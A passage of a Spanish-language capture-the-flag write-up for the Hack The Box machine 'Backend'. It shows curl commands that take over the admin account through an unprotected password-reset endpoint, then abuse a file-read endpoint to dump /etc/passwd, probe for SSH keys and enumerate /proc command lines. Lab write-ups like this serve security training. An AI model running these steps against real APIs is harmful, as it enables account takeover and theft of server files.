</code></pre></div><p>Vamos a cambiar el formato del cuerpo a <code>application/x-www-form-urlencoded</code> (el formato por defecto en <code>curl</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/user/login -sd <span class=code-dark-yellow>'username=7rocky@htb.local&password=asdffdsa'</span> | <span class=code-dark-green>jq</span>
{
  <span class=code-blue>"access_token"</span>: <span class=code-dark-green>"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg"</span>,  
  <span class=code-blue>"token_type"</span>: <span class=code-dark-green>"bearer"</span>
}
</code></pre></div><p>Y ahí tenemos el <em>token</em> JWT. Vamos a decodificarlo en <a href=https://jwt.io>jwt.io</a>:</p><p><img src=/images/HTB/Backend/Backend-jwt.png alt="Backend JWT"></p><p>Hay una clave llamada <code>is_superuser</code>, que está en <code>false</code>. Parece claro que tenemos que generar un <em>token</em> que tenga <code>is_superuser</code> en <code>true</code>.</p><h2 id=leyendo-documentación>Leyendo documentación</h2><p>Vamos a ver la ruta <code>/docs</code> usando el <em>token</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/docs -H <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg'</span>  

    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;
    &lt;link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css"&gt;
    &lt;link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png"&gt;
    &lt;title&gt;docs&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
    &lt;div id="swagger-ui"&gt;
    &lt;/div&gt;
    &lt;script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"&gt;&lt;/script&gt;
    &lt;!-- `SwaggerUIBundle` is now available on the page --&gt;
    &lt;script&gt;
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,

    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    &lt;/script&gt;
    &lt;/body&gt;
    &lt;/html&gt;
</code></pre></div><p>Para ver esta respuesta en el navegador, podemos usar Burp Suite para interceptar la petición, poner la cabecera <code>Authorization</code> y renderizar el contenido de la respuesta en Burp Suite (Repeater):</p><p><img src=/images/HTB/Backend/Backend-burp.png alt="Backend Burp Suite docs"></p><p>Aquí hay un error al solicitar <code>openapi.json</code> porque la cabecera <code>Authorization</code> no está configurada para esa petición en particular. En su lugar, podemos descargar el archivo con <code>curl</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/openapi.json -o openapi.json -sH <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg'</span>  
</code></pre></div><p>Y luego lo importamos en Swagger:</p><p><img src=/images/HTB/Backend/Backend-swagger.png alt="Backend Swagger import"></p><p><img src=/images/HTB/Backend/Backend-swagger-import.png alt="Backend Swagger import"></p><p><img src=/images/HTB/Backend/Backend-swagger-import-name.png alt="Backend Swagger import"></p><p>Y estas son todas las rutas disponibles:</p><p><img src=/images/HTB/Backend/Backend-swagger-docs1.png alt="Backend endpoints"></p><p><img src=/images/HTB/Backend/Backend-swagger-docs2.png alt="Backend endpoints"></p><p><img src=/images/HTB/Backend/Backend-swagger-docs3.png alt="Backend endpoints"></p><p>En este punto, podemos ver la <em>flag</em> <code>user.txt</code> con una petición PUT a <code>/api/v1/user/SecretFlagEndpoint</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -X PUT 10.10.11.161/api/v1/user/SecretFlagEndpoint  
{"user.txt":"50b343d5b2d4d836abdc7320b87ee384"}
</code></pre></div><h2 id=obteniendo-acceso-privilegiado>Obteniendo acceso privilegiado</h2><p>Hay una ruta <code>/api/v1/user/updatepass</code> que solamente necesita unos pocos parámetros:</p><p><img src=/images/HTB/Backend/Backend-swagger-updatepass.png alt="Backend updatepass"></p><p>Solo el <code>guid</code> y la nueva contraseña (<code>password</code>). A lo mejor somos capaces de cambiar la contraseña de <code>admin</code> (su <code>guid</code> es <code>36c2e94a-4271-4259-93bf-c96ad5948284</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s 10.10.11.161/api/v1/user/1 | <span class=code-dark-green>jq</span>
{
  <span class=code-blue>"guid"</span>: <span class=code-dark-green>"36c2e94a-4271-4259-93bf-c96ad5948284"</span>,
  <span class=code-blue>"email"</span>: <span class=code-dark-green>"admin@htb.local"</span>,
  <span class=code-blue>"date"</span>: <span class=code-grey>null</span>,
  <span class=code-blue>"time_created"</span>: 1649533388111,
  <span class=code-blue>"is_superuser"</span>: true,
  <span class=code-blue>"id"</span>: 1
}

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/user/updatepass -d <span class=code-dark-yellow>'{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","password":"asdffdsa"}'</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> -H <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg'</span> | <span class=code-dark-green>jq</span>  
{
  <span class=code-blue>"date"</span>: <span class=code-grey>null</span>,
  <span class=code-blue>"id"</span>: 1,
  <span class=code-blue>"is_superuser"</span>: true,
  <span class=code-blue>"hashed_password"</span>: <span class=code-dark-green>"$2b$12$Fqdwt6M5VTxcCM3VSxctwe3o5IUhuWSnSeOHvxNd8GPgUxzW1XoqS"</span>,
  <span class=code-blue>"guid"</span>: <span class=code-dark-green>"36c2e94a-4271-4259-93bf-c96ad5948284"</span>,
  <span class=code-blue>"email"</span>: <span class=code-dark-green>"admin@htb.local"</span>,
  <span class=code-blue>"time_created"</span>: 1649533388111,
  <span class=code-blue>"last_update"</span>: <span class=code-grey>null</span>
}
</code></pre></div><p>Y ahora podemos iniciar sesión como <code>admin</code>, tenemos su <em>token</em> JWT:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/user/login -sd <span class=code-dark-yellow>'username=admin@htb.local&password=asdffdsa'</span> | <span class=code-dark-green>jq</span>
{
  <span class=code-blue>"access_token"</span>: <span class=code-dark-green>"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw"</span>,  
  <span class=code-blue>"token_type"</span>: <span class=code-dark-green>"bearer"</span>
}
</code></pre></div><p>Hay una ruta que permite a los usuarios privilegiados ejecutar comandos:</p><p><img src=/images/HTB/Backend/Backend-swagger-exec.png alt="Backend exec"></p><p>Vamos a probar pues:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/admin/exec/whoami -H <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw'</span>  
{"detail":"Debug key missing from JWT"}
</code></pre></div><p>Pero aún no podemos, necesitamos añadir una clave <code>debug</code> en el <em>token</em> JWT para habilitar la ejecución de comandos.</p><h2 id=leyendo-archivos-del-servidor>Leyendo archivos del servidor</h2><p>Hay otra ruta interesante que permite leer archivos del servidor (la vimos antes con <code>ffuf</code>):</p><p><img src=/images/HTB/Backend/Backend-swagger-file.png alt="Backend file"></p><p>Este es el archivo <code>/etc/passwd</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/admin/file -d <span class=code-dark-yellow>'{"file":"/etc/passwd"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> -sH <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw'</span>
{"file":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n"}  
</code></pre></div><p>Podemos poner el <em>token</em> JWT en una variable y usar <code>jq</code> para extraer el contenido del archivo solicitado, por comodidad:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> token=<span class=code-dark-yellow>'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw'</span>  

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/admin/file -d <span class=code-dark-yellow>'{"file":"/etc/passwd"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> -sH <span class=code-dark-yellow>"Authorization: Bearer <span class=code-dark-cyan>$token</span>"</span> | <span class=code-dark-green>jq</span> -r .file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</code></pre></div><p>Además, podemos crear una función en Bash llamada <code>get_file</code> que tome la ruta del archivo y muestre su contenido:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-yellow>function</span> get_file<span class=code-dark-yellow>() {</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/admin/file -d <span class=code-dark-yellow>"{<span class=code-dark-cyan>\"</span>file<span class=code-dark-cyan>\"</span>:<span class=code-dark-cyan>\"$1\"</span>}"</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> -sH <span class=code-dark-yellow>"Authorization: Bearer <span class=code-dark-cyan>$token</span>"</span> | <span class=code-dark-green>jq</span> -r .file 2&gt;<span class=mtku>/dev/null</span>; <span class=code-dark-yellow>}</span>  
</code></pre></div><p>Aquí tenemos <code>user.txt</code> otra vez:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>get_file</span> /home/htb/user.txt
50b343d5b2d4d836abdc7320b87ee384  
</code></pre></div><p>No hay clave privada de SSH disponible:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>get_file</span> /home/htb/.ssh/id_rsa  
Internal Server Error
</code></pre></div><p>En este punto, tenemso que encontrar el código fuente de la API. Como podemos leer archivos arbitrarios del servidor, podemos enumerar cómo se están ejecutando los procesos en <code>/proc/&lt;PID>/cmdline</code>, por lo que vamos a ver algunos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-yellow>for</span> i in {1..1000}; <span class=code-dark-yellow>do</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>"<span class=code-dark-cyan>$i</span>: "</span>; <span class=code-dark-green>get_file</span> /proc/$i/cmdline; <span class=code-dark-green>echo</span>; <span class=code-dark-yellow>done</span> | <span class=code-dark-green>grep</span> -a <span class=code-dark-yellow>': .'</span> | <span class=code-dark-green>grep</span> -av Error
1: /sbin/initmaybe-ubiquity
478: /lib/systemd/systemd-journald
506: /lib/systemd/systemd-udevd
508: /lib/systemd/systemd-networkd
591: /sbin/multipathd-d-s
592: /sbin/multipathd-d-s
593: /sbin/multipathd-d-s
594: /sbin/multipathd-d-s
595: /sbin/multipathd-d-s
596: /sbin/multipathd-d-s
597: /sbin/multipathd-d-s
610: /lib/systemd/systemd-timesyncd
622: /usr/bin/VGAuthService
625: /usr/bin/vmtoolsd
644: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160
645: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160
646: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160
647: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160
649: /usr/lib/accountsservice/accounts-daemon
650: /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only
655: /usr/lib/accountsservice/accounts-daemon
658: /usr/sbin/irqbalance--foreground
659: /usr/bin/python3/usr/bin/networkd-dispatcher--run-startup-triggers
660: /usr/lib/policykit-1/polkitd--no-debug
661: /usr/sbin/rsyslogd-n-iNONE
663: /usr/lib/policykit-1/polkitd--no-debug
666: /lib/systemd/systemd-logind
667: /usr/sbin/irqbalance--foreground
668: /usr/lib/udisks2/udisksd
669: /usr/sbin/runuser-uhtb--/home/htb/uhc/run.sh
673: /usr/sbin/rsyslogd-n-iNONE
674: /usr/sbin/rsyslogd-n-iNONE
675: /usr/sbin/rsyslogd-n-iNONE
688: /usr/lib/udisks2/udisksd
691: /home/htb/uhc/.venv/bin/python3/home/htb/uhc/.venv/bin/uvicorn--reload--host0.0.0.0--port80app.main:app
697: /usr/lib/policykit-1/polkitd--no-debug
698: /usr/lib/accountsservice/accounts-daemon
699: /usr/lib/udisks2/udisksd
702: /usr/sbin/ModemManager
708: /usr/bin/vmtoolsd
709: /usr/bin/vmtoolsd
712: /usr/lib/udisks2/udisksd
715: /usr/sbin/ModemManager
719: /usr/sbin/ModemManager
720: /usr/lib/udisks2/udisksd
725: /home/htb/uhc/.venv/bin/python3-cfrom multiprocessing.resource_tracker import main;main(4)
726: /home/htb/uhc/.venv/bin/python3-cfrom multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)--multiprocessing-fork  
727: /lib/systemd/systemd-timesyncd
729: /usr/bin/vmtoolsd
796: /lib/systemd/systemd-resolved
837: /usr/sbin/cron-f
841: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal
842: /usr/sbin/atd-f
843: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
854: /sbin/agetty-o-p -- \u--nocleartty1linux
857: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal
</code></pre></div><p>Aquí tenemos algunos comandos interesantes. Tenemos que formatearlos (existen bytes nulos, que tenemos que cambiar por espacios en blanco):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>669: /usr/sbin/runuser -u htb -- /home/htb/uhc/run.sh
</span></span><span style=display:flex><span>691: /home/htb/uhc/.venv/bin/python3 /home/htb/uhc/.venv/bin/uvicorn --reload --host 0.0.0.0 --port 80 app.main:app
</span></span><span style=display:flex><span>725: /home/htb/uhc/.venv/bin/python3 -c from multiprocessing.resource_tracker import main;main(4)
</span></span><span style=display:flex><span>726: /home/htb/uhc/.venv/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork
</span></span></code></pre></div><p>De hecho, el proceso importante es el de PID 669, que ejecuta un <em>script</em> <code>/home/htb/uhc/run.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>get_file</span> /home/htb/uhc/run.sh  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/bin/bash</span>

<span class=mtk7>cd</span> <span class=mtk1>/home/htb/uhc</span>
<span class=mtk7>source</span> <span class=mtk1>.venv/bin/activate</span>
<span class=mtk5>export</span> <span class=mtk1>APP_MODULE=${APP_MODULE-app.main</span><span class=mtk5>:</span><span class=mtk1>app}</span>
<span class=mtk5>export</span> <span class=mtk1>HOST=${HOST</span><span class=mtk5>:-</span><span class=mtk1>0.0.0.0}</span>
<span class=mtk5>export</span> <span class=mtk1>PORT=${PORT</span><span class=mtk5>:-</span><span class=mtk1>80}</span>

<span class=mtk1>python3</span> <span class=mtk1>populateauth.py</span>
<span class=mtk7>exec</span> <span class=mtk1>uvicorn</span> <span class=mtk1>--reload</span> <span class=mtk1>--host</span> <span class=mtk1>$HOST</span> <span class=mtk1>--port</span> <span class=mtk1>$PORT</span> <span class=mtk4>"</span><span class=mtk1>$APP_MODULE</span><span class=mtk4>"</span>  
</code></pre></div><p>Esto puede ser algo confuso, ya que no hay ningún archivo Python que se esté ejecutando con <code>uvicorn</code> (que es un <em>framework</em> de Python). Hay una referencia a un módulo llamado <code>app.main</code>. En Python, esto se traduce en <code>app/main.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>get_file</span> /home/htb/uhc/app/main.py  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3># ...</span>

<span class=mtk5>from</span> <span class=mtk1>app.schemas.user</span> <span class=mtk5>import</span> <span class=mtk1>User</span>
<span class=mtk5>from</span> <span class=mtk1>app.api.v1.api</span> <span class=mtk5>import</span> <span class=mtk1>api_router</span>
<span class=mtk5>from</span> <span class=mtk1>app.core.config</span> <span class=mtk5>import</span> <span class=mtk1>settings</span>

<span class=mtk5>from</span> <span class=mtk1>app</span> <span class=mtk5>import</span> <span class=mtk1>deps</span>
<span class=mtk5>from</span> <span class=mtk1>app</span> <span class=mtk5>import</span> <span class="mtk1 squiggly-inline-unnecessary">crud</span>


<span class=mtk1>app</span> <span class=mtk5>=</span> <span class=mtk1>FastAPI(</span><span class="mtk9 mtki">title</span><span class=mtk5>=</span><span class=mtk4>"UHC</span> <span class=mtk4>API</span> <span class=mtk4>Quals"</span><span class=mtk1>,</span> <span class="mtk9 mtki">openapi_url</span><span class=mtk5>=</span><span class=mtk6>None</span><span class=mtk1>,</span> <span class="mtk9 mtki">docs_url</span><span class=mtk5>=</span><span class=mtk6>None</span><span class=mtk1>,</span> <span class="mtk9 mtki">redoc_url</span><span class=mtk5>=</span><span class=mtk6>None</span><span class=mtk1>)</span>  
<span class=mtk1>root_router</span> <span class=mtk5>=</span> <span class=mtk1>APIRouter(</span><span class="mtk9 mtki">default_response_class</span><span class=mtk5>=</span><span class=mtk1>UJSONResponse)</span>


<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.get</span><span class=mtk1>(</span><span class=mtk4>"/"</span><span class=mtk1>,</span> <span class="mtk9 mtki">status_code</span><span class=mtk5>=</span><span class=mtk6>200</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>root</span><span class=mtk1>():</span>
    <span class=mtk4>"""</span>
    <span class=mtk4>Root</span> <span class=mtk4>GET</span>
    <span class=mtk4>"""</span>
    <span class=mtk5>return</span> <span class=mtk1>{</span><span class=mtk4>"msg"</span><span class=mtk1>:</span> <span class=mtk4>"UHC</span> <span class=mtk4>API</span> <span class=mtk4>Version</span> <span class=mtk4>1.0"</span><span class=mtk1>}</span>


<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.get</span><span class=mtk1>(</span><span class=mtk4>"/api"</span><span class=mtk1>,</span> <span class="mtk9 mtki">status_code</span><span class=mtk5>=</span><span class=mtk6>200</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>list_versions</span><span class=mtk1>():</span>
    <span class=mtk4>"""</span>
    <span class=mtk4>Versions</span>
    <span class=mtk4>"""</span>
    <span class=mtk5>return</span> <span class=mtk1>{</span><span class=mtk4>"endpoints"</span><span class=mtk1>:[</span><span class=mtk4>"v1"</span><span class=mtk1>]}</span>


<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.get</span><span class=mtk1>(</span><span class=mtk4>"/api/v1"</span><span class=mtk1>,</span> <span class="mtk9 mtki">status_code</span><span class=mtk5>=</span><span class=mtk6>200</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>list_endpoints_v1</span><span class=mtk1>():</span>
    <span class=mtk4>"""</span>
    <span class=mtk4>Version</span> <span class=mtk4>1</span> <span class=mtk4>Endpoints</span>
    <span class=mtk4>"""</span>
